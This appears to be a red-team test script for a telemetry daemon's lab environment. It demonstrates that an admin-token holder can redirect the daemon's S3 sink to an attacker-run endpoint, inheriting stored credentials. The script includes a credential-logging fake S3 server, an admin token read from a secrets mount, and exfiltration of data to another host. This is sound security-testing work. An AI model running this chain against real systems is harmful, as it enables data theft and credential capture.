#!/usr/bin/env bash
# vagrant/scenarios/rt-3-2-s3-redirect.sh — RT-3: S3 destination exfil with
# inherited credentials (docs/redteam-plan.md row rt-3-2; the s3parquet twin
# of rt-3-1's tcp catcher).
#
# The chain: the victim runs the §29 S3 sink shape (s3parquet to the in-VM
# Garage fixture, its own credential pair). An attacker holding the ADMIN
# credential does `xtcp2ctl get`, rewrites the config's dest to their own
# S3-compatible endpoint, and `reconfigure`s the daemon — leaving the S3
# credential fields EMPTY. Set's secret-preservation rule ("empty credential
# fields mean unchanged, not clear") then INHERITS the running creds, so the
# daemon brings its own AccessKey/SecretKey to the attacker's endpoint: the
# attacker never needs to know them. The scenario pins:
#   - the exfil works end-to-end (CONFIRMED): parquet objects arrive at the
#     attacker's fake S3 within one flush;
#   - the credential disclosure rides along: the SigV4 Authorization header
#     lands in the attacker's log with the victim's access key id;
#   - the RT-11 tier-4 blind: the victim's own Garage goes dark while the
#     dest is redirected (its object store stops growing);
#   - the audit trail: the "Set: reconfigure requested" audit line is the
#     only detector (same gap as rt-3-1);
#   - trap-restore: the original config goes back in and Garage resumes.
set -euo pipefail

: "${XTCP2_AUTH:=raw}"
: "${XTCP2_ATTACKER:=admin}" # Set is an admin method
: "${XTCP2_DEST:=s3}" # the §29 S3 sink shape (the in-VM Garage fixture)
XTCP2_EXPECT="${XTCP2_EXPECT:-CONFIRMED}"

# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/matrix.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/evidence.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/ssh.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/deploy.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/invariant.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/assert.sh"

xtcp2_matrix_defaults
xtcp2_preflight
evidence_init

echo "rt-3-2: evidence in $RT_EVIDENCE"

xtcp2_deploy victim attacker
wait_for 120 "daemon answers on the victim VM" vm_exec victim \
  "curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:9088/metrics | grep -qE '^(200|401|403)\$'"

xtcp2_cotenant_read_token # the admin tier mounts the whole secrets dir
admin_token="$(vm_exec victim 'sudo docker exec rt-attacker cat /run/secrets/admin')"
[ -n "$admin_token" ] || xtcp2_die 'no admin token in the attacker container'
CTL=/opt/xtcp2-redteam/bin/xtcp2ctl
CTL_ARGS="-network tcp -target 192.168.142.10 -port 8889 -auth-token"

# The victim's own S3 storage, read host-side (RT-11 invariant style: the
# storage, never a daemon gauge — an attacker who blinds the daemon cannot
# also forge it). garage v2 inlines small blocks into its metadata store, so
# the object COUNT from `bucket info` is the observable (not data-dir files).
garage_objects() {
  vm_exec victim 'sudo docker exec rt-garage /garage -c /etc/garage/garage.toml bucket info xtcp2-records 2>/dev/null' \
    | grep -E '^Objects:' | grep -oE '[0-9]+'
}
garage_blocks_ge_1() { [ "$(garage_objects)" -ge 1 ]; }

# --- baseline: the victim's Garage receives objects --------------------------
wait_for 90 "the victim's garage holds at least one object" garage_blocks_ge_1
b0="$(garage_objects)"
sleep 8
b1="$(garage_objects)"
echo "rt-3-2: victim garage blocks during baseline: $b0 -> $b1"
if [ "$b1" -gt "$b0" ]; then
  ok "baseline: the daemon uploads parquet objects to its own garage ($b0 -> $b1 objects)"
else
  not_ok "baseline: garage objects did not grow ($b0 -> $b1) — see evidence"
fi
vm_exec victim "curl -s -H 'Authorization: Bearer $RT_READ_TOKEN' http://127.0.0.1:9088/metrics" \
  >"$RT_EVIDENCE/metrics-baseline.txt" 2>&1 || true
if grep -q 'function="destS3Parquet",type="count",variable="upload"' "$RT_EVIDENCE/metrics-baseline.txt"; then
  ok "baseline: destS3Parquet upload counter present"
else
  not_ok "no destS3Parquet upload counter in metrics — see evidence"
fi

# --- the attacker's fake S3 (must accept BEFORE the Set) ---------------------
# A ~60-line permissive S3: answers HeadBucket (BucketExists probe), PUT
# (PutObject) and everything else with 200, stores object bodies host-side,
# and logs every request's Authorization header — the credential-disclosure
# evidence. Signature validation is UP TO THE SERVER'S OWNER: the attacker
# simply accepts, which is why "the attacker's endpoint doesn't know the
# victim's secret key" is no defense at all.
FAKE_S3=/tmp/rt3-2-fake-s3
FAKE_PORT=9000
vm_exec attacker "rm -rf $FAKE_S3 && mkdir -p $FAKE_S3/objects"
vm_push attacker /dev/null "$FAKE_S3/noop" >/dev/null 2>&1 || true # ensure the dir exists (vm_push is atomic anyway)
cat >"$RT_EVIDENCE/fake-s3.py" <<'PYEOF'
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

ROOT = sys.argv[1]

class H(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _log(self):
        with open(ROOT + "/headers.log", "a") as f:
            f.write("%s %s %s\n" % (self.command, self.path,
                                    self.headers.get("Authorization", "-")))

    def _ok(self, body=b""):
        self.send_response(200)
        self.send_header("ETag", '"rt3-2-fake"')
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if body:
            self.wfile.write(body)

    def do_HEAD(self):
        self._log()
        self._ok()

    def do_PUT(self):
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n)
        self._log()
        key = self.path.strip("/").replace("/", "_")
        with open(ROOT + "/objects/" + key, "ab") as f:
            f.write(body)
        self._ok()

    def do_GET(self):
        self._log()
        self._ok(b'<?xml version="1.0"?><LocationConstraint xmlns="http://s3.amazonaws.com/doc/2006-03-01/">us-east-1</LocationConstraint>')

    def do_POST(self):
        self._log()
        self._ok()

    def log_message(self, *a):
        pass

ThreadingHTTPServer(("0.0.0.0", 9000), H).serve_forever()
PYEOF
vm_push attacker "$RT_EVIDENCE/fake-s3.py" "$FAKE_S3/fake-s3.py"
vm_exec attacker 'pkill -f "[f]ake-s3.py" >/dev/null 2>&1 || true'
vm_exec attacker "setsid python3 $FAKE_S3/fake-s3.py $FAKE_S3 >/dev/null 2>&1 < /dev/null &"
wait_for 15 "the fake S3 accepts" vm_exec victim \
  "curl -s -o /dev/null -w '%{http_code}' -X HEAD http://192.168.142.11:$FAKE_PORT/attacker | grep -q 200"

# --- the rewrite: dest -> the attacker's S3, credentials EMPTY (inherited) --
vm_exec attacker "$CTL get $CTL_ARGS '$admin_token'" >"$RT_EVIDENCE/get-before.log" 2>&1
grep -q '"dest"' "$RT_EVIDENCE/get-before.log" || xtcp2_die 'get returned no dest field — see evidence'
python3 - "$RT_EVIDENCE/get-before.log" "$RT_EVIDENCE/attacker-config.json" <<'PYEOF'
import json, re, sys
src, dst = sys.argv[1:3]
body = re.sub(r'^.*?\n(?!.*Get)', '', open(src).read(), flags=re.S)  # strip the fog noise prefix lines
cfg = json.loads(body)
cfg["dest"] = "s3parquet:http://192.168.142.11:9000"
cfg["s3Bucket"] = "attacker"
cfg["s3AllowInsecure"] = True
cfg["s3FlushInterval"] = "2s"
cfg["s3ParquetFlushThresholdBytes"] = 2048
cfg["s3FlushThresholdJitterPct"] = 0
# THE POINT OF rt-3-2: the credential fields stay empty — Set's
# secret-preservation rule inherits the RUNNING creds, so the daemon brings
# its own access/secret key to the attacker's endpoint.
cfg.pop("s3AccessKey", None)
cfg.pop("s3SecretKey", None)
open(dst, "w").write(json.dumps(cfg))
PYEOF
vm_push attacker "$RT_EVIDENCE/attacker-config.json" /tmp/rt3-2-config.json

# --- the Set: soft-restart into the attacker's S3 ---------------------------
vm_exec attacker "$CTL reconfigure $CTL_ARGS '$admin_token' -file /tmp/rt3-2-config.json" \
  >"$RT_EVIDENCE/set-attack.log" 2>&1
if grep -q "ok: reconfigure accepted" "$RT_EVIDENCE/set-attack.log"; then
  ok "Set accepted — the daemon soft-restarted into the attacker's S3 (empty creds inherited)"
else
  not_ok "Set rejected — see evidence"
fi

# --- the exfil: parquet objects land at the attacker ------------------------
wait_for 45 "a parquet object arrives at the attacker's fake S3" vm_exec attacker \
  "grep -rl PAR1 $FAKE_S3/objects/ 2>/dev/null | grep -q ."
# NOTE: minio-go URL-encodes the object key ('=' -> %3D), so the on-disk name
# is host%3Drt-victim. And `grep -c` prints 0 AND exits 1 on no match — the
# remote side must not let that exit code kill the script (set -e).
n="$(vm_exec attacker "ls $FAKE_S3/objects/ 2>/dev/null | grep -c attacker || true")"
key_hit="$(vm_exec attacker "ls $FAKE_S3/objects/ 2>/dev/null | grep -c 'host[%=]3Drt-victim' || true")"
echo "rt-3-2: attacker S3 holds $n object(s) ($key_hit with the victim hostname in the key)"
if [ "$n" -ge 1 ] && [ "$key_hit" -ge 1 ]; then
  ok "exfil CONFIRMED: parquet objects with host=rt-victim keys arrive at the attacker's S3"
else
  not_ok "no parquet objects at the attacker's S3 — see evidence"
fi
# object content spot-check: the binary parquet carries the victim hostname
grep_hit="$(vm_exec attacker "grep -al rt-victim $FAKE_S3/objects/* 2>/dev/null | grep -c . || true")"
if [ "$grep_hit" -ge 1 ]; then
  ok "the object payload carries victim data (rt-victim in the parquet column bytes)"
else
  not_ok "no victim hostname in any object payload — see evidence"
fi

# --- the credential disclosure: the Authorization header --------------------
vm_exec attacker "cat $FAKE_S3/headers.log" >"$RT_EVIDENCE/fake-s3-headers.log" 2>&1 || true
if grep -q "GK787463703274657374000000" "$RT_EVIDENCE/fake-s3-headers.log"; then
  ok "credential disclosure: the victim's access key id (GK...) rides every SigV4 Authorization header into the attacker's log"
else
  not_ok "no victim access key in the fake S3's Authorization headers — see evidence"
fi

# --- the RT-11 tier-4 blind: the victim's garage goes dark -------------------
f0="$(garage_objects)"
sleep 8
f1="$(garage_objects)"
echo "rt-3-2: victim garage objects during the redirect: $f0 -> $f1"
if [ "$f0" = "$f1" ]; then
  ok "victim's own garage is BLIND during the redirect (the RT-11 tier-4 blind rides the same Set)"
else
  not_ok "victim's garage kept growing during the redirect ($f0 -> $f1) — see evidence"
fi

# --- the audit trail --------------------------------------------------------
audit="$(vm_exec victim 'sudo docker logs rt-xtcp2 2>&1 | grep -c "Set: reconfigure requested"')"
if [ "$audit" -ge 1 ]; then
  ok "audit: the daemon logged the Set (reconfigure requested, dest rewritten)"
else
  not_ok "no Set audit line in the daemon log (see evidence)"
fi

# --- the restore: reconfigure back to the garage sink ------------------------
grep -v '^\[fog\]' "$RT_EVIDENCE/get-before.log" >"$RT_EVIDENCE/restore-config.json"
vm_push attacker "$RT_EVIDENCE/restore-config.json" /tmp/rt3-2-original.json
vm_exec attacker "$CTL reconfigure $CTL_ARGS '$admin_token' -file /tmp/rt3-2-original.json" \
  >"$RT_EVIDENCE/set-restore.log" 2>&1
if grep -q "ok: reconfigure accepted" "$RT_EVIDENCE/set-restore.log"; then
  ok "restore Set accepted (the garage creds inherit back the same way)"
else
  not_ok "restore Set rejected — see evidence"
fi

r0="$(garage_objects)"
garage_resumed() { [ "$(garage_objects)" -gt "$r0" ]; }
wait_for 90 "the victim's garage resumes after the restore" garage_resumed
final_dest="$(vm_exec attacker "$CTL get $CTL_ARGS '$admin_token'" 2>/dev/null | grep -oE '"dest": *"[^"]*"' | head -1 | cut -d'"' -f4)"
if [ "$final_dest" = "s3parquet:http://127.0.0.1:3900" ]; then
  ok "final Get shows the original garage dest ($final_dest) — the daemon is restored"
else
  not_ok "final Get shows dest '$final_dest' (want the garage endpoint) — see evidence"
fi

# evidence: the attacker's haul
vm_exec attacker "ls $FAKE_S3/objects/" >"$RT_EVIDENCE/attacker-objects.txt" 2>&1 || true
vm_exec attacker "du -sh $FAKE_S3/objects/" >"$RT_EVIDENCE/attacker-haul.txt" 2>&1 || true
vm_exec attacker 'pkill -f "[f]ake-s3.py" >/dev/null 2>&1 || true'

# CONFIRMED: the exfil chain works by design (admin Set + empty-field
# inheritance); the pass criteria = the finding (egress/dest changes must be
# alarmed by deployment policy) + the audited restore, both pinned above.
finish rt-3-2 CONFIRMED
